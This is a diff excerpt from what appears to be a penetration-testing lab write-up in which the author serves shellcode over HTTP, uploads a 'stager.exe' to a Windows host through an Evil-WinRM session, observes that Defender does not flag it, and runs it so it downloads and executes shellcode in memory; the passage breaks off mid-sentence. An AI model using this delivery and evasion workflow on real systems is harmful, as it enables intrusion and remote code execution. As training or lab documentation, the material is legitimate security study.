@@ -832,4 +832,22 @@ This created the stager.exe
 python3 -m http.server 80
 ```
 
-So now its ready to be uploaded on to the target, once stager.exe is executed it should reach back to the web serve anf
+So now its ready to be uploaded on to the target, once stager.exe is executed it should reach back to the web serve and download the shellcode and run it in memory
+
+```python
+*Evil-WinRM* PS C:\Users\sharedadmin\Documents> upload stager.exe
+                                        
+Info: Uploading /home/kali/hsm/fragments/stager.exe to C:\Users\sharedadmin\Documents\stager.exe
+                                        
+Data: 11358888 bytes of 11358888 bytes copied
+                                        
+Info: Upload successful!
+```
+
+Now its uploaded, defender hasnt purged it, so it likely passes signature detections
+
+```python
+*Evil-WinRM* PS C:\Users\sharedadmin\Documents> .\stager.exe
+```
+
+Now 
